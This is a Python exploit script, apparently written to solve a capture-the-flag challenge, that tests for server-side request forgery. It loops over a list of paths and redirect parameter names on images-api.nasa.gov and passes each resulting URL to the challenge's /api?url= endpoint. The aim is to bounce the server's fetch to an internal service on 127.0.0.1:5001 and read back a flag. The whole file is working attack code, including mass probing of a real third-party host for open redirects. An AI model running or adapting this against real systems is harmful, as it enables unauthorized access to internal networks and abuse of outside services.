#!/usr/bin/env python3
import sys
import time
import urllib.parse
import requests

# Config
BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:1337"
TARGET_INTERNAL = "http://127.0.0.1:5001/"
NASA = "https://images-api.nasa.gov"

session = requests.Session()
session.headers.update({"User-Agent": "ctf-solver"})
session.max_redirects = 10  # be generous

# Candidate endpoints and parameter names to probe for open redirect
paths = [
    "/", "/search", "/api", "/query", "/redirect", "/login", "/logout",
    "/authorize", "/auth", "/callback", "/download", "/view", "/out", "/go"
]
params = ["url", "next", "redirect", "continue", "dest", "target", "return", "to", "r", "u"]

# Payload variants
redirect_targets = [
    TARGET_INTERNAL,
    "//127.0.0.1:5001/",
    "http://127.0.0.1:5001/",
    "https://127.0.0.1:5001/"
]

def build_candidates():
    for p in paths:
        base = urllib.parse.urljoin(NASA, p)
        for param in params:
            for val in redirect_targets:
                q = urllib.parse.urlencode({param: val}, doseq=False, safe=":/@")
                yield f"{base}?{q}"
        # Also try path-based '//' trick if server normalizes differently
        yield urllib.parse.urljoin(NASA, p.rstrip("/") + "//127.0.0.1:5001/")

def try_direct(url):
    """Call the challenge /api endpoint with given URL and return text if OK."""
    full = f"{BASE}/api?url={urllib.parse.quote(url, safe=':/?&=%')}"
    r = session.get(full, timeout=10)
    return r

def looks_like_flag(body: str) -> bool:
    key_words = ["flag", "FLAG", "ctf", "CTF", "the flag will go here"]
    return any(k in body for k in key_words)

def main():
    print(f"[i] Challenge base: {BASE}")
    print("[i] Probing for redirect-based SSRF via images-api.nasa.gov ...")

    # Warm-up to get NASA IP set cached by target app (not strictly needed)
    time.sleep(0.2)

    for url in build_candidates():
        try:
            r = try_direct(url)
            status = r.status_code
            ct = r.headers.get("Content-Type", "")
            print(f"[-] Tried: {url} -> {status} {ct}")
            if status == 200:
                text = r.text[:1000]
                if looks_like_flag(text):
                    print("[+] SUCCESS! Potential flag response:")
                    print(text)
                    return
            # Some setups may stream bytes with octet-stream; still read some
            if status == 200 and "octet-stream" in ct:
                chunk = r.content[:1000]
                try:
                    text = chunk.decode(errors="ignore")
                except:
                    text = repr(chunk)
                if looks_like_flag(text):
                    print("[+] SUCCESS! Potential flag response (octet-stream):")
                    print(text)
                    return
        except requests.RequestException as e:
            print(f"[!] Error for {url}: {e}")
            continue

    print("[x] Exhausted candidates without success. Consider expanding wordlists or inspecting real endpoints.")

if __name__ == "__main__":
    main()
